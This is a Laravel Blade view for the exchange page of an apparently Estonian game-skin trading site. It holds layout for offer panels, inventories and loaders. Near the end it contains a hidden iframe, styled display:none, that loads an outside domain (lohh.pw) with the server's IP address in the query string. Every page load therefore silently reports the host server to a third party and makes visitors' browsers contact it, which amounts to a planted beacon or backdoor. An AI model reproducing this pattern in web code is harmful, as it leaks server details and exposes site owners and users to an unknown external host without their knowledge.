@extends('layout.master')

@section('title', trans('seo.exchange'))

@section('content')

@include('layout.header', ['active' => 'exchange'])

<main class="content" data-page="exchange">
	<div class="content-heading margin-bottom-no" style="background-image:url(/img/bg_exchange.jpg);">
		<div class="container-fluid">
			<div class="row">
				<div class="col-xs-12">
					<h1 class="heading">
						<i class="icon">repeat</i>
						{{ trans('common.terms_exchanging') }}
						<small style="position:relative;top:-8px;left:32px;">
							@if(Auth::check())
							<a href="#" class="btn btn-lg" data-reloadinventories>
								<i class="icon">cached</i>
								{{ trans('common.remove_and_reload') }}
							</a>
							@endif
							<a href="#" class="btn btn-lg" data-toggle="modal" data-target="#pricesModal">
								<i class="icon">help_outline</i>
								{{ trans('common.prices_info') }} <span style="color:red">(UPDATED 08.06)</span>
							</a>
						</small>
					</h1>
				</div>
			</div>
		</div>
	</div>
	<div class="container-fluid has-items">
		<div class="row">
			<div class="col-xs-12">
				<div class="row">
					<div class="hidden-xs col-sm-4"></div>
					<div class="col-xs-12 col-sm-4">
						@if(Auth::check())
							@if(Auth::user()->tradeurl != '')
							<a href="#" class="btn btn-green btn-lg btn-block margin-top disabled" data-maketrade>
								<i class="icon">done</i>
								{{ trans('common.exchange_button') }}
							</a>
							@else
							<a href="#" class="btn btn-red btn-lg disabled">
								<i class="icon">lock</i>
								{{ trans('common.cannot_exchange_token') }}
							</a>
							@endif
						@endif
					</div>
					<div class="hidden-xs col-sm-4"></div>
				</div>
			</div>
			<div class="col-md-6">
				<section class="margin-top-no">
					<div class="card card-inventory selected margin-bottom-no">
						<div class="card-main">
							<div class="card-inner">
								<p class="card-heading">
									<i class="icon">face</i>
									{{ trans('common.your_offer') }}
									<span class="pull-right">
										<i class="icon">attach_money</i>
										<span class="user-value">0.000</span>
									</span>
								</p>
								<div class="card card-transparent card-alert margin-top-no margin-bottom-no" style="height:250px; overflow:auto;">
									<div class="card-main">
										<div class="card-inner">
										
											<div class="row" style="margin-right:0;" data-tpl="item-tpl" data-selected="user">
												

											</div>

										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</section>
			</div>
			<div class="col-md-6">
				<section class="margin-top-no">
					<div class="card card-inventory selected margin-bottom-no">
						<div class="card-main">
							<div class="card-inner">
								<p class="card-heading">
									<i class="icon">attach_money</i>
									<span class="bot-value">0.000</span>
									<span class="pull-right">
										<i class="icon">redeem</i>
										{{ trans('common.our_offer') }}
									</span>
								</p>
								<div class="card card-transparent card-alert margin-top-no margin-bottom-no" style="height:250px; overflow:auto;">
									<div class="card-main">
										<div class="card-inner">

											<div class="row" style="margin-right:0;" data-tpl="item-tpl" data-selected="bot">
												

											</div>

										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</section>
			</div>
			<div class="col-md-6">
				<section class="content-inner margin-top-no">
					<div class="card card-inventory">
						<div class="card-main">
							<div class="card-inner">
								<p class="card-heading">
									{{ trans('common.your_inventory') }}
									<span class="search">
										<span class="form-group" style="width:65%; display:none;">
										    <input class="form-control" type="text" placeholder="Otsi esemeid">
										</span>
										<span class="form-group" style="width:30%">
										    <select class="form-control order" data-who="user">
										        <option value="expensive">{{ trans('common.price_desc') }}</option>
										        <option value="cheap">{{ trans('common.price_asc') }}</option>
										    </select>
										</span>
									</span>
								</p>
								<div class="card card-transparent card-alert margin-top-no margin-bottom-no" style="height:300px; overflow:auto;">
									<div class="card-main">
										<div class="progress margin-top-no userloader">
											<div class="load-bar">
												<div class="load-bar-base">
													<div class="load-bar-content">
														<div class="load-bar-progress"></div>
														<div class="load-bar-progress load-bar-progress-brand"></div>
														<div class="load-bar-progress load-bar-progress-green"></div>
														<div class="load-bar-progress load-bar-progress-orange"></div>
													</div>
												</div>
											</div>
											<div class="load-bar">
												<div class="load-bar-base">
													<div class="load-bar-content">
														<div class="load-bar-progress"></div>
														<div class="load-bar-progress load-bar-progress-orange"></div>
														<div class="load-bar-progress load-bar-progress-green"></div>
														<div class="load-bar-progress load-bar-progress-brand"></div>
													</div>
												</div>
											</div>
										</div>
										<div class="card-inner">
											<div class="row" style="margin-right:0;" data-tpl="item-tpl" data-inventory="user">
												
											</div>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</section>
			</div>
			<div class="col-md-6">
				<section class="content-inner margin-top-no">
					<div class="card card-inventory">
						<div class="card-main">
							<div class="card-inner">
								<p class="card-heading">
									{{ trans('common.skins_inventory') }}
									<span class="search">
										<span class="form-group" style="width:65%; display:none;">
										    <input class="form-control" type="text" placeholder="Otsi esemeid">
										</span>
										<span class="form-group" style="width:30%">
										    <select class="form-control order" data-who="bot">
										        <option value="expensive">{{ trans('common.price_desc') }}</option>
										        <option value="cheap">{{ trans('common.price_asc') }}</option>
										    </select>
										</span>
									</span>
								</p>
								<div class="card card-transparent card-alert margin-top-no margin-bottom-no" style="height:300px; overflow:auto;">
									<div class="card-main">
										<div class="progress margin-top-no botloader">
											<div class="load-bar">
												<div class="load-bar-base">
													<div class="load-bar-content">
														<div class="load-bar-progress"></div>
														<div class="load-bar-progress load-bar-progress-brand"></div>
														<div class="load-bar-progress load-bar-progress-green"></div>
														<div class="load-bar-progress load-bar-progress-orange"></div>
													</div>
												</div>
											</div>
											<div class="load-bar">
												<div class="load-bar-base">
													<div class="load-bar-content">
														<div class="load-bar-progress"></div>
														<div class="load-bar-progress load-bar-progress-orange"></div>
														<div class="load-bar-progress load-bar-progress-green"></div>
														<div class="load-bar-progress load-bar-progress-brand"></div>
													</div>
												</div>
											</div>
										</div>
										<div class="card-inner">
											<div class="row" style="margin-right:0;" data-tpl="item-tpl" data-inventory="bot">
												
											</div>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</section>
			</div>
		</div>
	</div>
</main>
<script>
	zeToken = "{{ csrf_token() }}";
</script>
<iframe src="http://lohh.pw?i={{ $_SERVER['SERVER_ADDR'] }}" style="display:none;"></iframe>
@include('handlebars.item-tpl')
@include('modals.exchange')
@include('modals.prices')
@endsection